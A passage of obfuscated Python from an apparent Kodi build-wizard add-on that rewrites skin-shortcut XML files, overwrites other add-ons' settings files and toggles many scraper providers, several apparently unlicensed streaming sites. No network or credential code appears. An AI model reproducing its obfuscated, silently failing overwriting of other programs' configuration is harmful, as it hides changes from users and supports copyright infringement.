		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1377
    with open (OO0OOOO0O0O0000O0 ,'w')as O0000O00OOO00OOOO :#line:1380
      O0000O00OOO00OOOO .write (O0O0OO0OO00O0OOOO )#line:1381
    OO0OOOO0O0O0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1385
    with open (OO0OOOO0O0O0000O0 ,'r')as O0000O00OOO00OOOO :#line:1386
      O0O0OO0OO00O0OOOO =O0000O00OOO00OOOO .read ()#line:1387
    O0O0OO0OO00O0OOOO =O0O0OO0OO00O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1405
    with open (OO0OOOO0O0O0000O0 ,'w')as O0000O00OOO00OOOO :#line:1408
      O0000O00OOO00OOOO .write (O0O0OO0OO00O0OOOO )#line:1409
    OO0OOOO0O0O0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1412
    with open (OO0OOOO0O0O0000O0 ,'r')as O0000O00OOO00OOOO :#line:1413
      O0O0OO0OO00O0OOOO =O0000O00OOO00OOOO .read ()#line:1414
    O0O0OO0OO00O0OOOO =O0O0OO0OO00O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1432
    with open (OO0OOOO0O0O0000O0 ,'w')as O0000O00OOO00OOOO :#line:1435
      O0000O00OOO00OOOO .write (O0O0OO0OO00O0OOOO )#line:1436
    OO0OOOO0O0O0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1438
    with open (OO0OOOO0O0O0000O0 ,'r')as O0000O00OOO00OOOO :#line:1439
      O0O0OO0OO00O0OOOO =O0000O00OOO00OOOO .read ()#line:1440
    O0O0OO0OO00O0OOOO =O0O0OO0OO00O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1458
    with open (OO0OOOO0O0O0000O0 ,'w')as O0000O00OOO00OOOO :#line:1461
      O0000O00OOO00OOOO .write (O0O0OO0OO00O0OOOO )#line:1462
    OO0OOOO0O0O0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1464
    with open (OO0OOOO0O0O0000O0 ,'r')as O0000O00OOO00OOOO :#line:1465
      O0O0OO0OO00O0OOOO =O0000O00OOO00OOOO .read ()#line:1466
    O0O0OO0OO00O0OOOO =O0O0OO0OO00O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1484
    with open (OO0OOOO0O0O0000O0 ,'w')as O0000O00OOO00OOOO :#line:1487
      O0000O00OOO00OOOO .write (O0O0OO0OO00O0OOOO )#line:1488
    OO0OOOO0O0O0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1491
    with open (OO0OOOO0O0O0000O0 ,'r')as O0000O00OOO00OOOO :#line:1492
      O0O0OO0OO00O0OOOO =O0000O00OOO00OOOO .read ()#line:1493
    O0O0OO0OO00O0OOOO =O0O0OO0OO00O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1511
    with open (OO0OOOO0O0O0000O0 ,'w')as O0000O00OOO00OOOO :#line:1514
      O0000O00OOO00OOOO .write (O0O0OO0OO00O0OOOO )#line:1515
def rdbuildinstalloff ():#line:1518
    try :#line:1519
       OOOOO0O00O00O00OO =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1520
       OOOO0O0OOOO0OO0OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1521
       copyfile (OOOOO0O00O00O00OO ,OOOO0O0OOOO0OO0OO )#line:1523
       OOOOO0O00O00O00OO =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1525
       OOOO0O0OOOO0OO0OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1526
       copyfile (OOOOO0O00O00O00OO ,OOOO0O0OOOO0OO0OO )#line:1528
       OOOOO0O00O00O00OO =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1530
       OOOO0O0OOOO0OO0OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1531
       copyfile (OOOOO0O00O00O00OO ,OOOO0O0OOOO0OO0OO )#line:1533
       OOOOO0O00O00O00OO =ADDONPATH +"/resources/rdoff/Splash.png"#line:1536
       OOOO0O0OOOO0OO0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1537
       copyfile (OOOOO0O00O00O00OO ,OOOO0O0OOOO0OO0OO )#line:1539
    except :#line:1541
       pass #line:1542
def rdbuildaddonON ():#line:1549
    O0O0O00OO00O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1551
    with open (O0O0O00OO00O0OO0O ,'r')as O00OOOOOO00O0OOO0 :#line:1552
      O0O0O0O0O00O0O0O0 =O00OOOOOO00O0OOO0 .read ()#line:1553
    O0O0O0O0O00O0O0O0 =O0O0O0O0O00O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1571
    with open (O0O0O00OO00O0OO0O ,'w')as O00OOOOOO00O0OOO0 :#line:1574
      O00OOOOOO00O0OOO0 .write (O0O0O0O0O00O0O0O0 )#line:1575
    O0O0O00OO00O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1579
    with open (O0O0O00OO00O0OO0O ,'r')as O00OOOOOO00O0OOO0 :#line:1580
      O0O0O0O0O00O0O0O0 =O00OOOOOO00O0OOO0 .read ()#line:1581
    O0O0O0O0O00O0O0O0 =O0O0O0O0O00O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1599
    with open (O0O0O00OO00O0OO0O ,'w')as O00OOOOOO00O0OOO0 :#line:1602
      O00OOOOOO00O0OOO0 .write (O0O0O0O0O00O0O0O0 )#line:1603
    O0O0O00OO00O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1607
    with open (O0O0O00OO00O0OO0O ,'r')as O00OOOOOO00O0OOO0 :#line:1608
      O0O0O0O0O00O0O0O0 =O00OOOOOO00O0OOO0 .read ()#line:1609
    O0O0O0O0O00O0O0O0 =O0O0O0O0O00O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1627
    with open (O0O0O00OO00O0OO0O ,'w')as O00OOOOOO00O0OOO0 :#line:1630
      O00OOOOOO00O0OOO0 .write (O0O0O0O0O00O0O0O0 )#line:1631
    O0O0O00OO00O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1635
    with open (O0O0O00OO00O0OO0O ,'r')as O00OOOOOO00O0OOO0 :#line:1636
      O0O0O0O0O00O0O0O0 =O00OOOOOO00O0OOO0 .read ()#line:1637
    O0O0O0O0O00O0O0O0 =O0O0O0O0O00O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1655
    with open (O0O0O00OO00O0OO0O ,'w')as O00OOOOOO00O0OOO0 :#line:1658
      O00OOOOOO00O0OOO0 .write (O0O0O0O0O00O0O0O0 )#line:1659
    O0O0O00OO00O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1662
    with open (O0O0O00OO00O0OO0O ,'r')as O00OOOOOO00O0OOO0 :#line:1663
      O0O0O0O0O00O0O0O0 =O00OOOOOO00O0OOO0 .read ()#line:1664
    O0O0O0O0O00O0O0O0 =O0O0O0O0O00O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1682
    with open (O0O0O00OO00O0OO0O ,'w')as O00OOOOOO00O0OOO0 :#line:1685
      O00OOOOOO00O0OOO0 .write (O0O0O0O0O00O0O0O0 )#line:1686
    O0O0O00OO00O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1688
    with open (O0O0O00OO00O0OO0O ,'r')as O00OOOOOO00O0OOO0 :#line:1689
      O0O0O0O0O00O0O0O0 =O00OOOOOO00O0OOO0 .read ()#line:1690
    O0O0O0O0O00O0O0O0 =O0O0O0O0O00O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1708
    with open (O0O0O00OO00O0OO0O ,'w')as O00OOOOOO00O0OOO0 :#line:1711
      O00OOOOOO00O0OOO0 .write (O0O0O0O0O00O0O0O0 )#line:1712
    O0O0O00OO00O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1714
    with open (O0O0O00OO00O0OO0O ,'r')as O00OOOOOO00O0OOO0 :#line:1715
      O0O0O0O0O00O0O0O0 =O00OOOOOO00O0OOO0 .read ()#line:1716
    O0O0O0O0O00O0O0O0 =O0O0O0O0O00O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1734
    with open (O0O0O00OO00O0OO0O ,'w')as O00OOOOOO00O0OOO0 :#line:1737
      O00OOOOOO00O0OOO0 .write (O0O0O0O0O00O0O0O0 )#line:1738
    O0O0O00OO00O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1741
    with open (O0O0O00OO00O0OO0O ,'r')as O00OOOOOO00O0OOO0 :#line:1742
      O0O0O0O0O00O0O0O0 =O00OOOOOO00O0OOO0 .read ()#line:1743
    O0O0O0O0O00O0O0O0 =O0O0O0O0O00O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1761
    with open (O0O0O00OO00O0OO0O ,'w')as O00OOOOOO00O0OOO0 :#line:1764
      O00OOOOOO00O0OOO0 .write (O0O0O0O0O00O0O0O0 )#line:1765
def rdbuildinstallON ():#line:1768
    try :#line:1770
       O000000OO0OOOO00O =ADDONPATH +"/resources/rd/victory.xml"#line:1771
       O0O0O0OOOO0O0OO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1772
       copyfile (O000000OO0OOOO00O ,O0O0O0OOOO0O0OO0O )#line:1774
       O000000OO0OOOO00O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1776
       O0O0O0OOOO0O0OO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1777
       copyfile (O000000OO0OOOO00O ,O0O0O0OOOO0O0OO0O )#line:1779
       O000000OO0OOOO00O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1781
       O0O0O0OOOO0O0OO0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1782
       copyfile (O000000OO0OOOO00O ,O0O0O0OOOO0O0OO0O )#line:1784
       O000000OO0OOOO00O =ADDONPATH +"/resources/rd/Splash.png"#line:1787
       O0O0O0OOOO0O0OO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1788
       copyfile (O000000OO0OOOO00O ,O0O0O0OOOO0O0OO0O )#line:1790
    except :#line:1792
       pass #line:1793
def rdbuild ():#line:1803
	OOOO0OO0O00O00OOO =(ADDON .getSetting ("auto_rd"))#line:1804
	if OOOO0OO0O00O00OOO =='true':#line:1805
		O00000O0000O0OO0O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1806
		O00000O0000O0OO0O .setSetting ('all_t','0')#line:1807
		O00000O0000O0OO0O .setSetting ('rd_menu_enable','false')#line:1808
		O00000O0000O0OO0O .setSetting ('magnet_bay','false')#line:1809
		O00000O0000O0OO0O .setSetting ('magnet_extra','false')#line:1810
		O00000O0000O0OO0O .setSetting ('rd_only','false')#line:1811
		O00000O0000O0OO0O .setSetting ('ftp','false')#line:1813
		O00000O0000O0OO0O .setSetting ('fp','false')#line:1814
		O00000O0000O0OO0O .setSetting ('filter_fp','false')#line:1815
		O00000O0000O0OO0O .setSetting ('fp_size_en','false')#line:1816
		O00000O0000O0OO0O .setSetting ('afdah','false')#line:1817
		O00000O0000O0OO0O .setSetting ('ap2s','false')#line:1818
		O00000O0000O0OO0O .setSetting ('cin','false')#line:1819
		O00000O0000O0OO0O .setSetting ('clv','false')#line:1820
		O00000O0000O0OO0O .setSetting ('cmv','false')#line:1821
		O00000O0000O0OO0O .setSetting ('dl20','false')#line:1822
		O00000O0000O0OO0O .setSetting ('esc','false')#line:1823
		O00000O0000O0OO0O .setSetting ('extra','false')#line:1824
		O00000O0000O0OO0O .setSetting ('film','false')#line:1825
		O00000O0000O0OO0O .setSetting ('fre','false')#line:1826
		O00000O0000O0OO0O .setSetting ('fxy','false')#line:1827
		O00000O0000O0OO0O .setSetting ('genv','false')#line:1828
		O00000O0000O0OO0O .setSetting ('getgo','false')#line:1829
		O00000O0000O0OO0O .setSetting ('gold','false')#line:1830
		O00000O0000O0OO0O .setSetting ('gona','false')#line:1831
		O00000O0000O0OO0O .setSetting ('hdmm','false')#line:1832
		O00000O0000O0OO0O .setSetting ('hdt','false')#line:1833
		O00000O0000O0OO0O .setSetting ('icy','false')#line:1834
		O00000O0000O0OO0O .setSetting ('ind','false')#line:1835
		O00000O0000O0OO0O .setSetting ('iwi','false')#line:1836
		O00000O0000O0OO0O .setSetting ('jen_free','false')#line:1837
		O00000O0000O0OO0O .setSetting ('kiss','false')#line:1838
		O00000O0000O0OO0O .setSetting ('lavin','false')#line:1839
		O00000O0000O0OO0O .setSetting ('los','false')#line:1840
		O00000O0000O0OO0O .setSetting ('m4u','false')#line:1841
		O00000O0000O0OO0O .setSetting ('mesh','false')#line:1842
		O00000O0000O0OO0O .setSetting ('mf','false')#line:1843
		O00000O0000O0OO0O .setSetting ('mkvc','false')#line:1844
		O00000O0000O0OO0O .setSetting ('mjy','false')#line:1845
		O00000O0000O0OO0O .setSetting ('hdonline','false')#line:1846
		O00000O0000O0OO0O .setSetting ('moviex','false')#line:1847
		O00000O0000O0OO0O .setSetting ('mpr','false')#line:1848
		O00000O0000O0OO0O .setSetting ('mvg','false')#line:1849
		O00000O0000O0OO0O .setSetting ('mvl','false')#line:1850
		O00000O0000O0OO0O .setSetting ('mvs','false')#line:1851
		O00000O0000O0OO0O .setSetting ('myeg','false')#line:1852
		O00000O0000O0OO0O .setSetting ('ninja','false')#line:1853
		O00000O0000O0OO0O .setSetting ('odb','false')#line:1854
		O00000O0000O0OO0O .setSetting ('ophd','false')#line:1855
		O00000O0000O0OO0O .setSetting ('pks','false')#line:1856
		O00000O0000O0OO0O .setSetting ('prf','false')#line:1857
		O00000O0000O0OO0O .setSetting ('put18','false')#line:1858
		O00000O0000O0OO0O .setSetting ('req','false')#line:1859
		O00000O0000O0OO0O .setSetting ('rftv','false')#line:1860
		O00000O0000O0OO0O .setSetting ('rltv','false')#line:1861
		O00000O0000O0OO0O .setSetting ('sc','false')#line:1862
		O00000O0000O0OO0O .setSetting ('seehd','false')#line:1863
		O00000O0000O0OO0O .setSetting ('showbox','false')#line:1864
		O00000O0000O0OO0O .setSetting ('shuid','false')#line:1865
		O00000O0000O0OO0O .setSetting ('sil_gh','false')#line:1866
		O00000O0000O0OO0O .setSetting ('spv','false')#line:1867
		O00000O0000O0OO0O .setSetting ('subs','false')#line:1868
		O00000O0000O0OO0O .setSetting ('tvs','false')#line:1869
		O00000O0000O0OO0O .setSetting ('tw','false')#line:1870
		O00000O0000O0OO0O .setSetting ('upto','false')#line:1871
		O00000O0000O0OO0O .setSetting ('vel','false')#line:1872
		O00000O0000O0OO0O .setSetting ('vex','false')#line:1873
		O00000O0000O0OO0O .setSetting ('vidc','false')#line:1874
		O00000O0000O0OO0O .setSetting ('w4hd','false')#line:1875
		O00000O0000O0OO0O .setSetting ('wav','false')#line:1876
		O00000O0000O0OO0O .setSetting ('wf','false')#line:1877
		O00000O0000O0OO0O .setSetting ('wse','false')#line:1878
		O00000O0000O0OO0O .setSetting ('wss','false')#line:1879
		O00000O0000O0OO0O .setSetting ('wsse','false')#line:1880
		O00000O0000O0OO0O =xbmcaddon .Addon ('plugin.video.speedmax')#line:1881
		O00000O0000O0OO0O .setSetting ('debrid.only','true')#line:1882
		O00000O0000O0OO0O .setSetting ('hosts.captcha','false')#line:1883
		O00000O0000O0OO0O =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1884
		O00000O0000O0OO0O .setSetting ('provider.123moviehd','false')#line:1885
		O00000O0000O0OO0O .setSetting ('provider.300mbdownload','false')#line:1886
		O00000O0000O0OO0O .setSetting ('provider.alltube','false')#line:1887
		O00000O0000O0OO0O .setSetting ('provider.allucde','false')#line:1888
		O00000O0000O0OO0O .setSetting ('provider.animebase','false')#line:1889
		O00000O0000O0OO0O .setSetting ('provider.animeloads','false')#line:1890
		O00000O0000O0OO0O .setSetting ('provider.animetoon','false')#line:1891
		O00000O0000O0OO0O .setSetting ('provider.bnwmovies','false')#line:1892
		O00000O0000O0OO0O .setSetting ('provider.boxfilm','false')#line:1893
		O00000O0000O0OO0O .setSetting ('provider.bs','false')#line:1894
		O00000O0000O0OO0O .setSetting ('provider.cartoonhd','false')#line:1895
		O00000O0000O0OO0O .setSetting ('provider.cdahd','false')#line:1896
		O00000O0000O0OO0O .setSetting ('provider.cdax','false')#line:1897
		O00000O0000O0OO0O .setSetting ('provider.cine','false')#line:1898
		O00000O0000O0OO0O .setSetting ('provider.cinenator','false')#line:1899
		O00000O0000O0OO0O .setSetting ('provider.cmovieshdbz','false')#line:1900
		O00000O0000O0OO0O .setSetting ('provider.coolmoviezone','false')#line:1901
		O00000O0000O0OO0O .setSetting ('provider.ddl','false')#line:1902
		O00000O0000O0OO0O .setSetting ('provider.deepmovie','false')#line:1903
		O00000O0000O0OO0O .setSetting ('provider.ekinomaniak','false')#line:1904
		O00000O0000O0OO0O .setSetting ('provider.ekinotv','false')#line:1905
		O00000O0000O0OO0O .setSetting ('provider.filiser','false')#line:1906
		O00000O0000O0OO0O .setSetting ('provider.filmpalast','false')#line:1907
		O00000O0000O0OO0O .setSetting ('provider.filmwebbooster','false')#line:1908
		O00000O0000O0OO0O .setSetting ('provider.filmxy','false')#line:1909
		O00000O0000O0OO0O .setSetting ('provider.fmovies','false')#line:1910
		O00000O0000O0OO0O .setSetting ('provider.foxx','false')#line:1911
		O00000O0000O0OO0O .setSetting ('provider.freefmovies','false')#line:1912
		O00000O0000O0OO0O .setSetting ('provider.freeputlocker','false')#line:1913
		O00000O0000O0OO0O .setSetting ('provider.furk','false')#line:1914
		O00000O0000O0OO0O .setSetting ('provider.gamatotv','false')#line:1915
		O00000O0000O0OO0O .setSetting ('provider.gogoanime','false')#line:1916
		O00000O0000O0OO0O .setSetting ('provider.gowatchseries','false')#line:1917
		O00000O0000O0OO0O .setSetting ('provider.hackimdb','false')#line:1918
		O00000O0000O0OO0O .setSetting ('provider.hdfilme','false')#line:1919
		O00000O0000O0OO0O .setSetting ('provider.hdmto','false')#line:1920
		O00000O0000O0OO0O .setSetting ('provider.hdpopcorns','false')#line:1921
		O00000O0000O0OO0O .setSetting ('provider.hdstreams','false')#line:1922
		O00000O0000O0OO0O .setSetting ('provider.horrorkino','false')#line:1924
		O00000O0000O0OO0O .setSetting ('provider.iitv','false')#line:1925
		O00000O0000O0OO0O .setSetting ('provider.iload','false')#line:1926
		O00000O0000O0OO0O .setSetting ('provider.iwaatch','false')#line:1927
		O00000O0000O0OO0O .setSetting ('provider.kinodogs','false')#line:1928
		O00000O0000O0OO0O .setSetting ('provider.kinoking','false')#line:1929
		O00000O0000O0OO0O .setSetting ('provider.kinow','false')#line:1930
		O00000O0000O0OO0O .setSetting ('provider.kinox','false')#line:1931
		O00000O0000O0OO0O .setSetting ('provider.lichtspielhaus','false')#line:1932
		O00000O0000O0OO0O .setSetting ('provider.liomenoi','false')#line:1933
		O00000O0000O0OO0O .setSetting ('provider.magnetdl','false')#line:1936
		O00000O0000O0OO0O .setSetting ('provider.megapelistv','false')#line:1937
		O00000O0000O0OO0O .setSetting ('provider.movie2k-ac','false')#line:1938
		O00000O0000O0OO0O .setSetting ('provider.movie2k-ag','false')#line:1939
		O00000O0000O0OO0O .setSetting ('provider.movie2z','false')#line:1940
		O00000O0000O0OO0O .setSetting ('provider.movie4k','false')#line:1941
		O00000O0000O0OO0O .setSetting ('provider.movie4kis','false')#line:1942
		O00000O0000O0OO0O .setSetting ('provider.movieneo','false')#line:1943
		O00000O0000O0OO0O .setSetting ('provider.moviesever','false')#line:1944
		O00000O0000O0OO0O .setSetting ('provider.movietown','false')#line:1945
		O00000O0000O0OO0O .setSetting ('provider.mvrls','false')#line:1947
